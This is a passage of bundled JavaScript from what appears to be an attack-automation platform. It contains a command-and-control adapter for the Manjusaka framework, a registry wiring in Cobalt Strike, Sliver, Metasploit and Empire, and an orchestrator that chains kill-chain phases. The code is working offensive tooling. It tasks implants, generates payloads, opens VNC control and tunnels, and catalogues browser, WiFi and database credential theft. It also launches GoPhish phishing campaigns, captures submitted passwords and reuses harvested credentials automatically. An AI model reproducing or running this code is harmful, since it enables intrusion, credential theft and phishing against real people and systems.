      headers: {
        "Authorization": `Bearer ${this.token}`,
        "Content-Type": "application/json",
        ...options.headers || {}
      }
    });
    if (!resp.ok) throw new Error(`Manjusaka API ${resp.status}: ${await resp.text()}`);
    return resp.json().catch(() => null);
  }
  async healthCheck() {
    try {
      const [health, agents] = await Promise.all([
        this.manjusakaFetch("/api/health").catch(() => null),
        this.manjusakaFetch("/api/agents").catch(() => [])
      ]);
      const agentCount = Array.isArray(agents) ? agents.length : agents?.data?.length || 0;
      return {
        framework: "manjusaka",
        connected: true,
        version: health?.version || "unknown",
        agentCount,
        activeJobs: health?.active_tasks || 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        details: {
          npc1Agents: Array.isArray(agents) ? agents.filter((a) => a.type === "npc1").length : 0,
          npc2Agents: Array.isArray(agents) ? agents.filter((a) => a.type === "npc2").length : 0,
          listeners: health?.listeners || 0,
          tunnels: health?.tunnels || 0
        }
      };
    } catch (err) {
      return {
        framework: "manjusaka",
        connected: false,
        agentCount: 0,
        activeJobs: 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        error: err.message
      };
    }
  }
  async listAgents() {
    try {
      const data = await this.manjusakaFetch("/api/agents");
      const agentList = Array.isArray(data) ? data : data?.data || [];
      return agentList.map((a) => ({
        id: a.id?.toString() || a.agent_id || `mjsk-${Date.now()}`,
        framework: "manjusaka",
        hostname: a.hostname || a.computer_name || "unknown",
        username: a.username || a.user || "unknown",
        platform: (a.platform || a.os || "unknown").toLowerCase(),
        architecture: a.architecture || a.arch || "x64",
        ipAddress: a.ip_address || a.remote_addr || a.external_ip || "",
        status: this.mapAgentStatus(a),
        lastSeen: a.last_checkin || a.last_seen || (/* @__PURE__ */ new Date()).toISOString(),
        privileges: this.inferPrivileges(a),
        transport: a.transport || a.protocol || "https",
        metadata: {
          type: a.type || (a.has_npc2 ? "npc2" : "npc1"),
          pid: a.pid,
          npc2Loaded: a.has_npc2 || a.type === "npc2",
          listenerId: a.listener_id,
          projectId: a.project_id,
          vncActive: a.vnc_active || false,
          tunnelCount: a.tunnel_count || 0
        }
      }));
    } catch {
      return [];
    }
  }
  mapAgentStatus(a) {
    if (a.status === "active" || a.status === "online") return "active";
    if (a.status === "dormant" || a.status === "sleeping") return "dormant";
    if (a.status === "dead" || a.status === "offline") return "dead";
    const lastCheckin = new Date(a.last_checkin || a.last_seen || 0).getTime();
    const elapsed = Date.now() - lastCheckin;
    if (elapsed < 5 * 60 * 1e3) return "active";
    if (elapsed < 30 * 60 * 1e3) return "dormant";
    return "dead";
  }
  inferPrivileges(a) {
    const user = (a.username || a.user || "").toLowerCase();
    if (user === "root" || user === "system" || user.includes("nt authority")) return "system";
    if (a.is_admin || a.elevated) return "admin";
    return "user";
  }
  async getAgent(agentId) {
    try {
      const data = await this.manjusakaFetch(`/api/agents/${agentId}`);
      if (!data) return null;
      const agents = await this.listAgents();
      return agents.find((a) => a.id === agentId) || null;
    } catch {
      const agents = await this.listAgents();
      return agents.find((a) => a.id === agentId) || null;
    }
  }
  async searchModules(query) {
    const manjusakaModules = [
      // ── Core Commands ──
      { id: "shell", framework: "manjusaka", name: "Shell", description: "Execute arbitrary shell command", type: "command", platform: ["windows", "linux"], techniqueId: "T1059.003", tactic: "execution" },
      { id: "interactive-shell", framework: "manjusaka", name: "Interactive Shell", description: "Open interactive terminal session", type: "command", platform: ["windows", "linux"], techniqueId: "T1059", tactic: "execution" },
      // ── File Management ──
      { id: "file-browse", framework: "manjusaka", name: "File Browse", description: "Browse filesystem on target", type: "command", platform: ["windows", "linux"], techniqueId: "T1083", tactic: "discovery" },
      { id: "file-upload", framework: "manjusaka", name: "File Upload", description: "Upload file to target (chunked with resume)", type: "command", platform: ["windows", "linux"], techniqueId: "T1105", tactic: "command-and-control" },
      { id: "file-download", framework: "manjusaka", name: "File Download", description: "Download file from target (chunked with resume)", type: "command", platform: ["windows", "linux"], techniqueId: "T1005", tactic: "collection" },
      { id: "file-delete", framework: "manjusaka", name: "File Delete", description: "Delete file on target", type: "command", platform: ["windows", "linux"], techniqueId: "T1070.004", tactic: "defense-evasion" },
      // ── VNC / Remote Desktop ──
      { id: "vnc-view", framework: "manjusaka", name: "VNC View", description: "View target desktop via VNC (smart compression, incremental updates)", type: "command", platform: ["windows", "linux"], techniqueId: "T1021.005", tactic: "lateral-movement" },
      { id: "vnc-control", framework: "manjusaka", name: "VNC Remote Control", description: "Full remote control of target desktop (mouse + keyboard)", type: "command", platform: ["windows", "linux"], techniqueId: "T1021.005", tactic: "lateral-movement" },
      // ── Screenshot ──
      { id: "screenshot", framework: "manjusaka", name: "Screenshot", description: "Capture screenshot of target desktop", type: "command", platform: ["windows", "linux"], techniqueId: "T1113", tactic: "collection" },
      // ── Credential Harvesting ──
      { id: "browser-creds", framework: "manjusaka", name: "Browser Credentials", description: "Extract credentials from Chromium browsers (Chrome, Edge, Opera, Brave, Vivaldi, 360, QQ)", type: "post", platform: ["windows"], techniqueId: "T1555.003", tactic: "credential-access" },
      { id: "wifi-passwords", framework: "manjusaka", name: "WiFi Passwords", description: "Extract WiFi SSID passwords via netsh", type: "post", platform: ["windows"], techniqueId: "T1555", tactic: "credential-access" },
      { id: "navicat-creds", framework: "manjusaka", name: "Navicat Credentials", description: "Extract Navicat database management credentials from registry", type: "post", platform: ["windows"], techniqueId: "T1555", tactic: "credential-access" },
      { id: "getpass", framework: "manjusaka", name: "GetPass Plugin", description: "Credential extraction plugin (passwords, hashes)", type: "post", platform: ["windows"], techniqueId: "T1003", tactic: "credential-access" },
      // ── System Reconnaissance ──
      { id: "sysinfo", framework: "manjusaka", name: "System Info", description: "Comprehensive system information (memory, CPU, temperature, interfaces)", type: "command", platform: ["windows", "linux"], techniqueId: "T1082", tactic: "discovery" },
      { id: "process-list", framework: "manjusaka", name: "Process List", description: "List running processes with PIDs", type: "command", platform: ["windows", "linux"], techniqueId: "T1057", tactic: "discovery" },
      { id: "netstat", framework: "manjusaka", name: "Network Connections", description: "List TCP/UDP connections with owning PIDs", type: "command", platform: ["windows", "linux"], techniqueId: "T1049", tactic: "discovery" },
      { id: "ifconfig", framework: "manjusaka", name: "Network Interfaces", description: "List network interfaces and addresses", type: "command", platform: ["windows", "linux"], techniqueId: "T1016", tactic: "discovery" },
      { id: "whoami", framework: "manjusaka", name: "Current User", description: "Get current user identity and privileges", type: "command", platform: ["windows", "linux"], techniqueId: "T1033", tactic: "discovery" },
      // ── Tunneling ──
      { id: "tunnel-create", framework: "manjusaka", name: "Create Tunnel", description: "Create network tunnel through compromised host for pivoting", type: "command", platform: ["windows", "linux"], techniqueId: "T1090", tactic: "command-and-control" },
      { id: "tunnel-list", framework: "manjusaka", name: "List Tunnels", description: "List active network tunnels", type: "command", platform: ["windows", "linux"], techniqueId: "T1090", tactic: "command-and-control" },
      { id: "tunnel-stop", framework: "manjusaka", name: "Stop Tunnel", description: "Terminate an active network tunnel", type: "command", platform: ["windows", "linux"], techniqueId: "T1090", tactic: "command-and-control" },
      // ── BOF / Plugin Execution ──
      { id: "bof-execute", framework: "manjusaka", name: "BOF Execute", description: "Execute Beacon Object File (Cobalt Strike compatible BOF)", type: "command", platform: ["windows"], techniqueId: "T1106", tactic: "execution" },
      { id: "crl-execute", framework: "manjusaka", name: "CRL Plugin Execute", description: "Execute CRL plugin module", type: "command", platform: ["windows", "linux"], techniqueId: "T1106", tactic: "execution" },
      // ── Agent Management ──
      { id: "load-npc2", framework: "manjusaka", name: "Load NPC2", description: "Upgrade NPC1 agent to full NPC2 (terminal, VNC, file mgmt, tunnels)", type: "command", platform: ["windows", "linux"], techniqueId: "T1105", tactic: "command-and-control" },
      { id: "unload-npc2", framework: "manjusaka", name: "Unload NPC2", description: "Unload NPC2 and revert to lightweight NPC1", type: "command", platform: ["windows", "linux"], techniqueId: "T1070", tactic: "defense-evasion" },
      { id: "self-destruct", framework: "manjusaka", name: "Self Destruct", description: "Remove agent from target and clean up artifacts", type: "command", platform: ["windows", "linux"], techniqueId: "T1070.004", tactic: "defense-evasion" }
    ];
    const q = query.toLowerCase();
    return manjusakaModules.filter(
      (c) => c.name.toLowerCase().includes(q) || c.description.toLowerCase().includes(q) || c.id.includes(q) || c.techniqueId?.toLowerCase().includes(q) || c.tactic?.toLowerCase().includes(q)
    );
  }
  async getModule(moduleId) {
    const modules = await this.searchModules(moduleId);
    return modules.find((m) => m.id === moduleId) || null;
  }
  async dispatch(request) {
    const startedAt = (/* @__PURE__ */ new Date()).toISOString();
    try {
      const agent = await this.getAgent(request.agentId);
      if (!agent) throw new Error(`Agent ${request.agentId} not found`);
      const result = await this.manjusakaFetch(`/api/agents/${request.agentId}/task`, {
        method: "POST",
        body: JSON.stringify({
          command: request.moduleId,
          args: request.options?.args || [],
          options: request.options || {},
          timeout: request.timeout || 300
        })
      });
      const taskId = result?.task_id || result?.id?.toString() || `mjsk-${Date.now()}`;
      return {
        taskId,
        framework: "manjusaka",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "running",
        exitCode: -1,
        stdout: result?.output || "",
        stderr: "",
        startedAt,
        metadata: { agentType: agent.metadata?.type, response: result }
      };
    } catch (err) {
      return {
        taskId: `mjsk-err-${Date.now()}`,
        framework: "manjusaka",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt,
        completedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async pollResult(taskId, agentId) {
    try {
      const result = await this.manjusakaFetch(`/api/agents/${agentId}/task/${taskId}`);
      const completed = result?.status === "completed" || result?.status === "success";
      return {
        taskId,
        framework: "manjusaka",
        agentId,
        moduleId: result?.command || "",
        status: completed ? "success" : result?.status === "failed" ? "failed" : "running",
        exitCode: completed ? 0 : result?.status === "failed" ? 1 : -1,
        stdout: result?.output || result?.stdout || "",
        stderr: result?.error || result?.stderr || "",
        startedAt: result?.started_at || (/* @__PURE__ */ new Date()).toISOString(),
        completedAt: completed ? result?.completed_at || (/* @__PURE__ */ new Date()).toISOString() : void 0
      };
    } catch (err) {
      return {
        taskId,
        framework: "manjusaka",
        agentId,
        moduleId: "",
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async killAgent(agentId) {
    try {
      await this.manjusakaFetch(`/api/agents/${agentId}`, { method: "DELETE" });
      return true;
    } catch {
      return false;
    }
  }
  // ─── Manjusaka-Specific Operations ──────────────────────────────────────────
  /** List all active listeners */
  async listListeners() {
    try {
      const data = await this.manjusakaFetch("/api/listeners");
      return Array.isArray(data) ? data : data?.data || [];
    } catch {
      return [];
    }
  }
  /** Create a new listener */
  async createListener(params) {
    return this.manjusakaFetch("/api/listeners", {
      method: "POST",
      body: JSON.stringify(params)
    });
  }
  /** Stop a listener */
  async stopListener(listenerId) {
    try {
      await this.manjusakaFetch(`/api/listeners/${listenerId}`, { method: "DELETE" });
      return true;
    } catch {
      return false;
    }
  }
  /** Generate NPC1 implant */
  async generateImplant(params) {
    return this.manjusakaFetch("/api/payloads/generate", {
      method: "POST",
      body: JSON.stringify(params)
    });
  }
  /** Load NPC2 on an existing NPC1 agent */
  async loadNpc2(agentId) {
    return this.manjusakaFetch(`/api/agents/${agentId}/load-npc2`, {
      method: "POST"
    });
  }
  /** Unload NPC2 from an agent */
  async unloadNpc2(agentId) {
    return this.manjusakaFetch(`/api/agents/${agentId}/unload-npc2`, {
      method: "POST"
    });
  }
  /** Start VNC session on agent */
  async startVnc(agentId) {
    return this.manjusakaFetch(`/api/agents/${agentId}/vnc/start`, {
      method: "POST"
    });
  }
  /** Stop VNC session on agent */
  async stopVnc(agentId) {
    return this.manjusakaFetch(`/api/agents/${agentId}/vnc/stop`, {
      method: "POST"
    });
  }
  /** List active tunnels */
  async listTunnels() {
    try {
      const data = await this.manjusakaFetch("/api/tunnels");
      return Array.isArray(data) ? data : data?.data || [];
    } catch {
      return [];
    }
  }
  /** Create a tunnel through an agent */
  async createTunnel(params) {
    return this.manjusakaFetch("/api/tunnels", {
      method: "POST",
      body: JSON.stringify(params)
    });
  }
  /** Stop a tunnel */
  async stopTunnel(tunnelId) {
    try {
      await this.manjusakaFetch(`/api/tunnels/${tunnelId}`, { method: "DELETE" });
      return true;
    } catch {
      return false;
    }
  }
  /** Execute BOF on agent */
  async executeBof(agentId, bofPath, args) {
    return this.dispatch({
      agentId,
      moduleId: "bof-execute",
      options: { bofPath, args: args || [] }
    });
  }
  /** Get aggregate stats */
  async getStats() {
    try {
      return await this.manjusakaFetch("/api/stats");
    } catch {
      return { agents: 0, listeners: 0, tunnels: 0 };
    }
  }
};
var C2Registry = class _C2Registry {
  constructor() {
    this.adapters = /* @__PURE__ */ new Map();
  }
  static {
    this.instance = null;
  }
  static getInstance() {
    if (!_C2Registry.instance) {
      _C2Registry.instance = new _C2Registry();
      _C2Registry.instance.register(new CalderaAdapter());
      _C2Registry.instance.register(new MetasploitAdapter());
      _C2Registry.instance.register(new SliverAdapter());
      _C2Registry.instance.register(new EmpireAdapter());
      _C2Registry.instance.register(new CobaltStrikeAdapter());
    }
    return _C2Registry.instance;
  }
  register(adapter) {
    this.adapters.set(adapter.framework, adapter);
  }
  get(framework) {
    return this.adapters.get(framework);
  }
  getAll() {
    return Array.from(this.adapters.values());
  }
  /** Health check all registered C2 frameworks */
  async healthCheckAll() {
    const results = await Promise.allSettled(
      this.getAll().map((a) => a.healthCheck())
    );
    return results.map(
      (r, i) => r.status === "fulfilled" ? r.value : {
        framework: this.getAll()[i].framework,
        connected: false,
        agentCount: 0,
        activeJobs: 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        error: r.reason?.message || "Unknown error"
      }
    );
  }
  /** List all agents across all C2 frameworks */
  async listAllAgents() {
    const results = await Promise.allSettled(
      this.getAll().map((a) => a.listAgents())
    );
    return results.flatMap(
      (r) => r.status === "fulfilled" ? r.value : []
    );
  }
  /** Search modules across all C2 frameworks */
  async searchAllModules(query) {
    const results = await Promise.allSettled(
      this.getAll().map((a) => a.searchModules(query))
    );
    return results.flatMap(
      (r) => r.status === "fulfilled" ? r.value : []
    );
  }
  /** Dispatch to the correct C2 framework based on agent ID lookup */
  async dispatch(request) {
    const adapter = this.get(request.framework);
    if (!adapter) throw new Error(`No adapter registered for ${request.framework}`);
    return adapter.dispatch(request);
  }
  /** Find which framework owns an agent */
  async resolveAgentFramework(agentId) {
    for (const adapter of this.getAll()) {
      const agent = await adapter.getAgent(agentId);
      if (agent) return adapter.framework;
    }
    return null;
  }
  /** Get aggregate stats across all C2 frameworks */
  async getAggregateStats() {
    const [health, agents] = await Promise.all([
      this.healthCheckAll(),
      this.listAllAgents()
    ]);
    const agentsByFramework = {};
    const agentsByPlatform = {};
    const agentsByStatus = {};
    for (const agent of agents) {
      agentsByFramework[agent.framework] = (agentsByFramework[agent.framework] || 0) + 1;
      agentsByPlatform[agent.platform] = (agentsByPlatform[agent.platform] || 0) + 1;
      agentsByStatus[agent.status] = (agentsByStatus[agent.status] || 0) + 1;
    }
    return {
      totalAgents: agents.length,
      activeAgents: agents.filter((a) => a.status === "active").length,
      frameworkStats: health,
      agentsByFramework,
      agentsByPlatform,
      agentsByStatus
    };
  }
};
function getC2Registry() {
  return C2Registry.getInstance();
}

// server/lib/c2-orchestrator.ts
var DEFAULT_FRAMEWORK_PRIORITY = {
  reconnaissance: ["caldera", "metasploit", "cobaltstrike", "empire", "manjusaka"],
  weaponization: ["cobaltstrike", "metasploit", "empire", "sliver", "manjusaka"],
  delivery: ["gophish", "cobaltstrike", "caldera", "empire", "manjusaka"],
  exploitation: ["metasploit", "cobaltstrike", "caldera", "sliver", "empire", "manjusaka"],
  installation: ["cobaltstrike", "sliver", "manjusaka", "empire", "caldera", "metasploit"],
  command_and_control: ["cobaltstrike", "sliver", "manjusaka", "empire", "caldera", "metasploit"],
  actions_on_objectives: ["cobaltstrike", "caldera", "manjusaka", "metasploit", "empire", "sliver"]
};
var activePlans = /* @__PURE__ */ new Map();
function persistPlanAsync(plan) {
  persistOrchestrationPlan({
    planId: plan.id,
    name: plan.name,
    description: plan.description,
    scanMode: plan.scanMode,
    status: plan.status,
    currentPhase: plan.currentPhase ?? void 0,
    stepsCompleted: plan.stepsCompleted,
    stepsFailed: plan.stepsFailed,
    stepsSkipped: plan.stepsSkipped,
    maxParallel: plan.maxParallel,
    abortOnFailure: plan.abortOnFailure,
    autoHandoff: plan.autoHandoff,
    phases: plan.phases,
    steps: plan.steps,
    frameworkPriority: plan.frameworkPriority,
    sharedContext: plan.sharedContext,
    log: plan.log,
    startedAt: plan.startedAt ?? void 0,
    completedAt: plan.completedAt ?? void 0
  }).catch(() => {
  });
}
function updatePlanStatusAsync(planId, updates) {
  updateOrchestrationPlanStatus(planId, updates).catch(() => {
  });
}
function createOrchestrationPlan(params) {
  const planId = generateId();
  const steps = [];
  const phases = /* @__PURE__ */ new Set();
  if (params.includePhishing && params.phishingConfig) {
    phases.add("delivery");
    steps.push({
      id: `${planId}-gophish-delivery`,
      order: 0,
      phase: "delivery",
      framework: "gophish",
      fallbackFrameworks: ["caldera"],
      label: `Phishing Campaign: ${params.phishingConfig.campaignName}`,
      description: "Launch phishing campaign to deliver initial payload",
      moduleId: "gophish-campaign",
      options: {},
      delayBeforeMs: 0,
      timeoutMs: 36e5,
      // 1 hour for phishing campaigns
      dependsOn: [],
      providesContext: ["phishing_results", "captured_credentials", "clicked_targets"],
      requiresContext: [],
      gophishConfig: params.phishingConfig,
      status: "pending"
    });
  }
  for (const node of params.nodes) {
    const phase = tacticToKillChainPhase(node.tactic);
    phases.add(phase);
    const priority = params.frameworkOverrides?.[phase] || DEFAULT_FRAMEWORK_PRIORITY[phase];
    const primaryFramework = selectBestFramework(node, priority);
    const incomingEdges = params.edges.filter((e) => e.targetNodeId === node.id);
    const dependsOn = incomingEdges.map((e) => e.sourceNodeId);
    const isFirstPostDelivery = params.includePhishing && phase !== "delivery" && dependsOn.length === 0;
    steps.push({
      id: node.id,
      order: node.order,
      phase,
      framework: primaryFramework,
      fallbackFrameworks: priority.filter((f) => f !== primaryFramework),
      label: node.label,
      description: node.description,
      techniqueId: node.techniqueId,
      moduleId: node.calderaAbilityId || node.techniqueId,
      options: {},
      targetPlatform: node.platform,
      delayBeforeMs: 0,
      timeoutMs: (node.timeout || 60) * 1e3,
      dependsOn: isFirstPostDelivery ? [`${planId}-gophish-delivery`] : dependsOn,
      providesContext: inferProvidedContext(node),
      requiresContext: inferRequiredContext(node),
      status: "pending"
    });
  }
  steps.sort((a, b) => a.order - b.order);
  const plan = {
    id: planId,
    name: params.name,
    description: params.description,
    phases: Array.from(phases),
    steps,
    frameworkPriority: {
      ...DEFAULT_FRAMEWORK_PRIORITY,
      ...params.frameworkOverrides || {}
    },
    sharedContext: {
      credentials: [],
      sessions: [],
      networkMap: [],
      phishingResults: [],
      facts: {}
    },
    scanMode: params.scanMode,
    maxParallel: params.maxParallel || 1,
    abortOnFailure: params.abortOnFailure ?? true,
    autoHandoff: params.autoHandoff ?? true,
    status: "planning",
    currentPhase: null,
    stepsCompleted: 0,
    stepsFailed: 0,
    stepsSkipped: 0,
    log: []
  };
  activePlans.set(planId, plan);
  persistPlanAsync(plan);
  return plan;
}
async function executeOrchestrationPlan(planId, environment) {
  const plan = activePlans.get(planId);
  if (!plan) throw new Error(`Orchestration plan ${planId} not found`);
  plan.status = "running";
  plan.startedAt = (/* @__PURE__ */ new Date()).toISOString();
  updatePlanStatusAsync(plan.id, { status: "running" });
  logEntry(plan, "info", null, null, null, `Orchestration plan "${plan.name}" started with ${plan.steps.length} steps across ${plan.phases.length} phases`);
  const registry = getC2Registry();
  const health = await registry.healthCheckAll();
  for (const h of health) {
    logEntry(
      plan,
      h.connected ? "info" : "warn",
      null,
      null,
      h.framework,
      `${h.framework}: ${h.connected ? "connected" : "disconnected"} (${h.agentCount} agents)`
    );
  }
  const completed = /* @__PURE__ */ new Set();
  const failed = /* @__PURE__ */ new Set();
  while (true) {
    const readySteps = plan.steps.filter(
      (s) => s.status === "pending" && s.dependsOn.every((dep) => completed.has(dep))
    );
    if (readySteps.length === 0) {
      const pendingSteps = plan.steps.filter((s) => s.status === "pending" || s.status === "waiting");
      if (pendingSteps.length === 0) break;
      const blockedSteps = pendingSteps.filter(
        (s) => s.dependsOn.some((dep) => failed.has(dep))
      );
      for (const blocked of blockedSteps) {
        blocked.status = "skipped";
        plan.stepsSkipped++;
        logEntry(
          plan,
          "warn",
          blocked.phase,
          blocked.id,
          blocked.framework,
          `Step "${blocked.label}" skipped \u2014 dependency failed`
        );
      }
      if (blockedSteps.length === pendingSteps.length) break;
      continue;
    }
    const batch = readySteps.slice(0, plan.maxParallel);
    const batchPromises = batch.map((step) => executeStep(plan, step, environment, registry));
    const results = await Promise.allSettled(batchPromises);
    for (let i = 0; i < results.length; i++) {
      const step = batch[i];
      const result = results[i];
      if (result.status === "fulfilled" && result.value) {
        completed.add(step.id);
        plan.stepsCompleted++;
        await extractAndShareContext(plan, step);
        await feedToLearningEngine(step, environment);
      } else {
        let recovered = false;
        for (const fallbackFw of step.fallbackFrameworks) {
          logEntry(
            plan,
            "warn",
            step.phase,
            step.id,
            fallbackFw,
            `Attempting fallback to ${fallbackFw} for "${step.label}"`
          );
          step.framework = fallbackFw;
          step.status = "pending";
          try {
            const fallbackResult = await executeStep(plan, step, environment, registry);
            if (fallbackResult) {
              completed.add(step.id);
              plan.stepsCompleted++;
              step.usedFramework = fallbackFw;
              step.status = "fallback";
              recovered = true;
              await extractAndShareContext(plan, step);
              break;
            }
          } catch {
            continue;
          }
        }
        if (!recovered) {
          failed.add(step.id);
          plan.stepsFailed++;
          if (plan.abortOnFailure) {
            plan.status = "failed";
            plan.completedAt = (/* @__PURE__ */ new Date()).toISOString();
            updatePlanStatusAsync(plan.id, { status: "failed", completedAt: plan.completedAt, stepsFailed: plan.stepsFailed, log: plan.log });
            logEntry(
              plan,
              "error",
              step.phase,
              step.id,
              step.framework,
              `Plan aborted \u2014 step "${step.label}" failed with no fallback`
            );
            return plan;
          }
        }
      }
    }
    const runningPhases = plan.steps.filter((s) => s.status === "running" || s.status === "pending").map((s) => s.phase);
    plan.currentPhase = runningPhases[0] || null;
  }
  plan.status = plan.stepsFailed > 0 ? "completed" : "completed";
  plan.completedAt = (/* @__PURE__ */ new Date()).toISOString();
  persistPlanAsync(plan);
  logEntry(
    plan,
    "success",
    null,
    null,
    null,
    `Orchestration complete: ${plan.stepsCompleted} succeeded, ${plan.stepsFailed} failed, ${plan.stepsSkipped} skipped`
  );
  return plan;
}
async function executeStep(plan, step, environment, registry) {
  step.status = "running";
  step.startedAt = (/* @__PURE__ */ new Date()).toISOString();
  if (step.delayBeforeMs > 0) {
    logEntry(
      plan,
      "info",
      step.phase,
      step.id,
      step.framework,
      `Waiting ${step.delayBeforeMs}ms before execution`
    );
    await sleep(step.delayBeforeMs);
  }
  logEntry(
    plan,
    "info",
    step.phase,
    step.id,
    step.framework,
    `Executing "${step.label}" via ${step.framework}`
  );
  try {
    if (step.framework === "gophish") {
      return await executeGoPhishStep(plan, step);
    }
    resolveContextRequirements(plan, step);
    const agentId = step.targetAgentId || await selectAgent(
      step.framework,
      step.targetPlatform || environment.os,
      step.requiredPrivilege,
      registry
    );
    if (!agentId) {
      step.status = "failed";
      step.error = `No suitable ${step.framework} agent found for platform ${step.targetPlatform || environment.os}`;
      logEntry(plan, "error", step.phase, step.id, step.framework, step.error);
      return false;
    }
    const taskRequest = {
      framework: step.framework,
      agentId,
      moduleId: step.moduleId,
      options: {
        ...step.options,
        // Inject shared context into options
        ...buildContextOptions(plan.sharedContext, step)
      },
      timeout: Math.floor(step.timeoutMs / 1e3)
    };
    const result = await registry.dispatch(taskRequest);
    step.result = result;
    if (result.status === "pending" || result.status === "running") {
      const finalResult = await pollForCompletion(
        step.framework,
        result.taskId,
        agentId,
        step.timeoutMs,
        registry
      );
      step.result = finalResult;
    }
    if (step.result.status === "success") {
      step.status = "success";
      step.completedAt = (/* @__PURE__ */ new Date()).toISOString();
      logEntry(
        plan,
        "success",
        step.phase,
        step.id,
        step.framework,
        `Step "${step.label}" completed successfully`
      );
      return true;
    } else {
      step.status = "failed";
      step.error = step.result.stderr || step.result.metadata?.error || "Task failed";
      step.completedAt = (/* @__PURE__ */ new Date()).toISOString();
      logEntry(
        plan,
        "error",
        step.phase,
        step.id,
        step.framework,
        `Step "${step.label}" failed: ${step.error}`
      );
      return false;
    }
  } catch (err) {
    step.status = "failed";
    step.error = err.message || "Unknown error";
    step.completedAt = (/* @__PURE__ */ new Date()).toISOString();
    logEntry(
      plan,
      "error",
      step.phase,
      step.id,
      step.framework,
      `Step "${step.label}" error: ${step.error}`
    );
    return false;
  }
}
async function executeGoPhishStep(plan, step) {
  const config = step.gophishConfig;
  if (!config) {
    step.status = "failed";
    step.error = "No GoPhish configuration provided";
    return false;
  }
  try {
    const { fetchGophish } = await import("./shared-FZHEB7P4.js");
    let campaignId;
    if (config.templateId && config.landingPageId && config.sendingProfileId && config.targetGroupId) {
      const campaignData = {
        name: config.campaignName,
        template: { id: config.templateId },
        page: { id: config.landingPageId },
        smtp: { id: config.sendingProfileId },
        groups: [{ id: config.targetGroupId }],
        url: config.payloadUrl || "",
        launch_date: (/* @__PURE__ */ new Date()).toISOString()
      };
      const result = await fetchGophish("/api/campaigns/", "POST", campaignData);
      campaignId = result.id;
      logEntry(
        plan,
        "info",
        "delivery",
        step.id,
        "gophish",
        `GoPhish campaign "${config.campaignName}" launched (ID: ${campaignId})`
      );
    } else {
      logEntry(
        plan,
        "warn",
        "delivery",
        step.id,
        "gophish",
        "No complete GoPhish config \u2014 skipping campaign launch"
      );
      step.status = "success";
      step.completedAt = (/* @__PURE__ */ new Date()).toISOString();
      return true;
    }
    const pollStart = Date.now();
    const maxWait = step.timeoutMs || 36e5;
    while (Date.now() - pollStart < maxWait) {
      await sleep(3e4);
      try {
        const campaign = await fetchGophish(`/api/campaigns/${campaignId}`);
        const results = campaign.results || [];
        for (const r of results) {
          const existing = plan.sharedContext.phishingResults.find(
            (pr) => pr.targetEmail === r.email && pr.campaignId === campaignId
          );
          if (!existing) {
            plan.sharedContext.phishingResults.push({
              campaignId,
              targetEmail: r.email,
              clicked: r.status === "Clicked Link" || r.status === "Submitted Data",
              submitted: r.status === "Submitted Data",
              timestamp: r.modified_date || (/* @__PURE__ */ new Date()).toISOString()
            });
          }
          if (r.status === "Submitted Data" && config.credentialForwardTo) {
            const creds = r.details || {};
            plan.sharedContext.credentials.push({
              username: creds.username || creds.email || r.email,
              password: creds.password,
              source: "gophish",
              discoveredAt: (/* @__PURE__ */ new Date()).toISOString(),
              usedBy: []
            });
            logEntry(
              plan,
              "success",
              "delivery",
              step.id,
              "gophish",
              `Credentials captured from ${r.email} \u2014 forwarding to ${config.credentialForwardTo}`
            );
          }
          if (r.status === "Clicked Link" && config.triggerOnClick || r.status === "Submitted Data" && config.triggerOnSubmit) {
            plan.sharedContext.facts["phishing_target_clicked"] = true;
            plan.sharedContext.facts["phishing_target_email"] = r.email;
            logEntry(
              plan,
              "success",
              "delivery",
              step.id,
              "gophish",
              `Target ${r.email} triggered \u2014 ready for C2 callback`
            );
          }
        }
        const clickCount = plan.sharedContext.phishingResults.filter((pr) => pr.clicked).length;
        if (clickCount > 0) {
          logEntry(
            plan,
            "success",
            "delivery",
            step.id,
            "gophish",
            `${clickCount} target(s) clicked \u2014 phishing delivery successful`
          );
          break;
        }
      } catch (pollErr) {
        logEntry(
          plan,
          "warn",
          "delivery",
          step.id,
          "gophish",
          `Campaign poll error: ${pollErr.message}`
        );
      }
    }
    step.status = "success";
    step.completedAt = (/* @__PURE__ */ new Date()).toISOString();
    return true;
  } catch (err) {
    step.status = "failed";
    step.error = err.message;
    logEntry(
      plan,
      "error",
      "delivery",
      step.id,
      "gophish",
      `GoPhish step failed: ${err.message}`
    );
    return false;
  }
}
async function extractAndShareContext(plan, step) {
  if (!step.result || step.result.status !== "success") return;
  const stdout = step.result.stdout || "";
  const credPatterns = [
    /(?:username|user|login)\s*[:=]\s*(\S+)\s+(?:password|pass|pwd)\s*[:=]\s*(\S+)/gi,
    /(\w+):(\$\w+\$[^\s]+)/g,
    // Unix hash format
    /(\w+):::([a-f0-9]{32})/gi
    // NTLM hash format
  ];
  for (const pattern of credPatterns) {
    let match;
    while ((match = pattern.exec(stdout)) !== null) {
      plan.sharedContext.credentials.push({
        username: match[1],
        password: match[2],
        source: step.framework,
        discoveredAt: (/* @__PURE__ */ new Date()).toISOString(),
        usedBy: []
      });
    }
  }
  if (step.phase === "reconnaissance" || step.techniqueId?.startsWith("T108")) {
    const hostPattern = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+.*?(?:open|listening)\s+(\d+)/g;
    let match2;
    while ((match2 = hostPattern.exec(stdout)) !== null) {
      const existing = plan.sharedContext.networkMap.find((n) => n.host === match2[1]);
      if (existing) {
        if (!existing.ports.includes(parseInt(match2[2]))) {
          existing.ports.push(parseInt(match2[2]));
        }
      } else {
        plan.sharedContext.networkMap.push({
          host: match2[1],
          ports: [parseInt(match2[2])],
          discoveredBy: step.framework,
          services: []
        });
      }
    }
  }
  for (const key of step.providesContext) {
    plan.sharedContext.facts[key] = true;
  }
}
function resolveContextRequirements(plan, step) {
  for (const key of step.requiresContext) {
    if (key === "captured_credentials" && plan.sharedContext.credentials.length > 0) {
      const cred = plan.sharedContext.credentials[0];
      step.options.username = cred.username;
      step.options.password = cred.password || cred.hash;
      cred.usedBy.push(step.framework);
    }
    if (key === "phishing_results") {
